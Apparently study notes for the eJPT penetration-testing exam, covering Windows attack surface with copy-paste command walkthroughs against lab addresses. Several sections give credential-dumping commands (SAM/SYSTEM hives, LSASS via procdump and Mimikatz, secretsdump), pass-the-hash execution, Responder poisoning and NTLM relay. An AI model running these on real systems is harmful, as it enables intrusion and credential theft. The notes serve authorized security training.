# 01 - Overview of Windows Vulnerabilities (eJPT Study Notes)

Note: The transcript is not provided. The following is a conservative, exam-focused summary inferred from the filename and typical eJPT “Vulnerability Assessment” coverage for Windows.

## What the video covers (Introduction / big picture)
- The Windows attack surface from a vulnerability assessment perspective:
  - Network-exposed services: SMB, RPC, RDP, WinRM, WMI, LDAP/AD, IIS.
  - Authentication weaknesses: LM/NTLM, NTLM relay, LLMNR/NBT-NS/WPAD, Pass-the-Hash.
  - Patch/state vulnerabilities: SMBv1/MS17-010 (EternalBlue), BlueKeep (RDP), Print Spooler abuses, Zerologon (DCs), PrintNightmare (modern).
  - Configuration/misconfig: SMB signing disabled, anonymous/guest access, weak share ACLs, null sessions, default shares (C$, ADMIN$).
  - Local privilege escalation patterns: unquoted service paths, weak service permissions, AlwaysInstallElevated, scheduled tasks, DLL hijacking, PATH hijacking.
  - Credential access: SAM/SYSTEM hives, LSASS dumping, DPAPI/Credential Manager.
- An ordered methodology:
  1) Identify Windows targets and roles, 2) enumerate services and exposure, 3) validate known vulns/misconfigs, 4) gather creds, 5) remote exec paths, 6) local privesc if needed.
- Caution: Only test on systems you are authorized to assess.

## Flow (ordered)
1) Scoping and discovery
   - Identify Windows hosts and potential domain controllers.
2) Port scan and fingerprint
   - TCP/UDP discovery, service/version detection, OS detection.
3) SMB/RPC enumeration
   - Shares, users, RID cycling, SMB signing, SMBv1, vulns (MS17-010).
4) RDP/WinRM/WMI checks
   - Encryption/NLA, BlueKeep check, WinRM available/auth method.
5) Web/IIS quick triage (if present)
   - Identify IIS version, default content, webdav, file uploads.
6) AD-centric exposure (if in a domain)
   - Kerberoasting, AS-REP roasting, LDAP info leaks; spooler/relay avenues.
7) Credential collection paths
   - Null/guest access, saved creds, SAM/SYSTEM, LSASS, GPP cpassword, DPAPI.
8) Remote execution paths (with creds or hashes)
   - SMB exec (Psexec/wmiexec), WinRM exec, WMI.
9) Local privilege escalation (post-access)
   - Services misconfigs, AlwaysInstallElevated, scheduled tasks, PATH/DLL hijack.
10) Confirm, document, recommend mitigations
   - Patches, configuration, hardening, exposure reduction.

## Tools highlighted
- Scanning/Enumeration: nmap, nbtscan, crackmapexec (CME), enum4linux-ng, smbmap, smbclient, rpcclient, impacket (lookupsid.py, samrdump.py).
- Vulnerability checks: nmap NSE (smb-vuln-ms17-010, smb-protocols, rdp-ntlm-info), rdpscan (BlueKeep).
- Auth/AD: impacket (GetUserSPNs.py, GetNPUsers.py, secretsdump.py, psexec.py, wmiexec.py), kerbrute (optional).
- Relay/Poison: Responder, ntlmrelayx.py.
- Local privesc/cred dump: winPEAS, accesschk.exe, Mimikatz/procdump (where allowed), reg.exe, icacls, sc/wmic, PowerShell.

## Typical command walkthrough (detailed, copy-paste friendly)
Assumptions:
- Attacker: Kali/Linux
- Target Windows host: 10.10.10.5
- Domain controller (if any): 10.10.10.10
- Domain: corp.local
- Interface: tun0 (adjust to your interface)
- Use only with authorization.

Set variables:
```bash
export TARGET=10.10.10.5
export DC_IP=10.10.10.10
export DOMAIN=corp.local
export USER='user'
export PASS='Password123!'
```

1) Discovery and scanning
```bash
# Quick ping sweep (adjust CIDR)
fping -aqg 10.10.10.0/24 2>/dev/null

# Fast top-ports to guide deeper scan
nmap -Pn -n --top-ports 2000 -sS -sV -oA scans/${TARGET}_top $TARGET

# Full TCP + service/version + OS
nmap -Pn -n -sS -sV -sC -O -p- --min-rate 2000 -oA scans/${TARGET}_full $TARGET

# UDP high-value (SMB/NetBIOS is TCP; but check snmp/dns/ntp if relevant)
nmap -Pn -sU --top-ports 50 -oA scans/${TARGET}_udp $TARGET
```

2) SMB/RPC enumeration and checks
```bash
# SMB info, signing, dialects, users/shares, MS17-010
nmap -Pn -p445 --script smb-os-discovery,smb2-security-mode,smb2-time,smb2-capabilities,smb-enum-users,smb-enum-shares,smb-protocols,smb-vuln-ms17-010 -oA scans/${TARGET}_smb $TARGET

# Anonymous/guest listing of shares
smbclient -N -L "//$TARGET"

# Try connecting to common shares anonymously
smbclient -N "//$TARGET/IPC$" -c 'recurse; ls'

# Broad SMB share/user mapping
smbmap -H $TARGET
smbmap -H $TARGET -u '' -p ''        # null
smbmap -H $TARGET -u guest -p ''     # guest

# RID cycling / user enum via anonymous SAMR (if permitted)
lookupsid.py -no-pass anonymous@$TARGET     # impacket
# or rpcclient
rpcclient -U "" -N $TARGET -c 'enumdomusers'
rpcclient -U "" -N $TARGET -c 'enumdomgroups'

# CrackMapExec quick checks (shares, sessions, policies)
crackmapexec smb $TARGET --shares
crackmapexec smb $TARGET --sessions
crackmapexec smb $TARGET --pass-pol
```

3) RDP/WinRM checks
```bash
# RDP encryption and NTLM info (and MS12-020 legacy vuln)
nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020 -oA scans/${TARGET}_rdp $TARGET

# BlueKeep check (optional tool)
# git clone https://github.com/robertdavidgraham/rdpscan && cd rdpscan && make
# ./rdpscan $TARGET

# WinRM ports and headers
nmap -p5985,5986 --script http-headers,http-methods,ssl-enum-ciphers -oA scans/${TARGET}_winrm $TARGET

# Validate WinRM auth with known creds (if any)
crackmapexec winrm $TARGET -u "$USER" -p "$PASS"
```

4) AD-oriented enumeration (if target is in a domain)
```bash
# Kerberoasting (find service accounts with SPNs and request TGS)
GetUserSPNs.py -request -dc-ip $DC_IP $DOMAIN/$USER:$PASS

# AS-REP roasting (users without preauth)
GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile users.txt
```

5) Cred harvesting (authorized)
```bash
# Dump SAM/SYSTEM remotely with admin creds
secretsdump.py $DOMAIN/$USER:$PASS@$TARGET

# If local shell: save registry hives (then exfiltrate for offline cracking)
reg save HKLM\SAM C:\Windows\Temp\SAM.bak
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.bak

# LSASS (if allowed and unprotected): use procdump then Mimikatz offline
# procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
# mimikatz.exe "sekurlsa::minidump C:\Windows\Temp\lsass.dmp" "sekurlsa::logonpasswords" exit
```

6) Remote execution (with creds or hashes)
```bash
# Pass-the-Hash examples (replace LM:NT with real hash; LM often 00000000000000000000000000000000)
psexec.py $DOMAIN/$USER@$TARGET -hashes 00000000000000000000000000000000:NTLM_HASH
wmiexec.py $DOMAIN/$USER@$TARGET -hashes 00000000000000000000000000000000:NTLM_HASH

# WinRM interactive shell (with clear-text creds)
evil-winrm -i $TARGET -u "$USER" -p "$PASS"
```

7) LLMNR/NBT-NS poisoning and NTLM relay (only in lab/authorized environments)
```bash
# Poison LLMNR/NBT-NS to capture NTLMv2 hashes
sudo responder -I tun0 -rdwv

# If SMB signing is not required on a target, prepare relay
echo $TARGET > targets.txt
sudo ntlmrelayx.py -tf targets.txt -smb2support
# Ensure Responder is configured NOT to SMB/HTTP-auth itself when relaying (Responder.conf).
```

8) Local privesc checks (post-compromise)
```cmd
:: Unquoted service paths (spaces + no quotes)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /v /i "C:\Windows\\" | findstr /v /i "\""

:: Show service config and binary
sc qc <ServiceName>
sc query <ServiceName>

:: Weak service permissions (Sysinternals AccessChk)
accesschk.exe -uwcqv "Authenticated Users" *  > perms.txt
accesschk.exe -uwcqv "Everyone" *            >> perms.txt

:: AlwaysInstallElevated (both must be 1 to be exploitable)
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: Scheduled tasks overview
schtasks /query /fo LIST /v

:: PATH hijack reconnaissance
set PATH
icacls "C:\Program Files" | findstr /i "Everyone Authenticated"
```

9) Quick PowerShell helpers (if available)
```powershell
# Unquoted services via PowerShell
Get-WmiObject win32_service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -match ' ' -and $_.PathName -notmatch '"' } | Select Name,DisplayName,PathName

# Installed patches (to assess missing updates like MS17-010 era)
Get-HotFix | Sort-Object InstalledOn | Select-Object -Last 20
```

## Practical tips
- Null and guest access still appear in lab/legacy environments: always test them first on SMB/RPC.
- SMB signing “required: false” enables relay risks; “true” blocks classic SMB relay.
- SMBv1 support is a red flag; check MS17-010 and disable SMBv1 as mitigation.
- RDP with NLA disabled or outdated builds can imply BlueKeep or brute-force potential; prefer protocol-level checks before heavy scanning.
- Use two-phase scanning: top ports quickly, then targeted deep scans to save time during exams.
- Save outputs (nmap -oA, CME output) and parse later; they often contain usernames/domains helpful for AS-REP/Kerberoast.
- On domain hosts, check for Printer Spooler exposure (use CME --spooler) and AD CS misconfigs (if in scope) for relay/ESC paths.
- For AlwaysInstallElevated, both HKLM and HKCU keys must be set to 1 to be exploitable.
- Prefer living-off-the-land execution (WinRM/WMI/SC) to avoid AV friction; avoid dropping binaries unless necessary.
- Document exact findings with proof (screenshots/command output) and map each to mitigations (patch, disable LLMNR, enforce SMB signing, remove SMBv1, harden service ACLs).

## Minimal cheat sheet (one-screen flow)
```bash
# Vars
export TARGET=10.10.10.5; export DC_IP=10.10.10.10; export DOMAIN=corp.local; export USER=user; export PASS='Password123!'

# Scan
nmap -Pn -n -sS -sV -O -p- -oA scans/${TARGET}_full $TARGET

# SMB enum
nmap -Pn -p445 --script smb-os-discovery,smb2-security-mode,smb-protocols,smb-enum-users,smb-enum-shares,smb-vuln-ms17-010 -oA scans/${TARGET}_smb $TARGET
smbclient -N -L "//$TARGET"
smbmap -H $TARGET
lookupsid.py -no-pass anonymous@$TARGET

# RDP/WinRM
nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info -oA scans/${TARGET}_rdp $TARGET
nmap -p5985,5986 $TARGET
crackmapexec winrm $TARGET -u "$USER" -p "$PASS"

# AD roast (if domain)
GetUserSPNs.py -request -dc-ip $DC_IP $DOMAIN/$USER:$PASS
GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile users.txt

# Remote exec (with creds/hash)
psexec.py $DOMAIN/$USER@$TARGET -hashes 00000000000000000000000000000000:NTLM_HASH
evil-winrm -i $TARGET -u "$USER" -p "$PASS"

# Cred dump (authorized)
secretsdump.py $DOMAIN/$USER:$PASS@$TARGET
```

## Summary
- This overview frames the Windows attack surface you’ll assess in eJPT: service exposure (SMB/RDP/WinRM), authentication weaknesses (NTLM/relay/LLMNR), patch/state vulns (MS17-010/BlueKeep), and common local privesc issues (services, installers, tasks).
- Use a systematic flow: identify Windows hosts, enumerate SMB/RPC and RDP/WinRM, validate high-impact vulns/misconfigs, leverage AD roasting where applicable, then proceed to credential use/exec and local privesc.
- The included commands and toolset cover the typical exam workflows and provide quick, copy-paste checks for high-value findings and safe validation.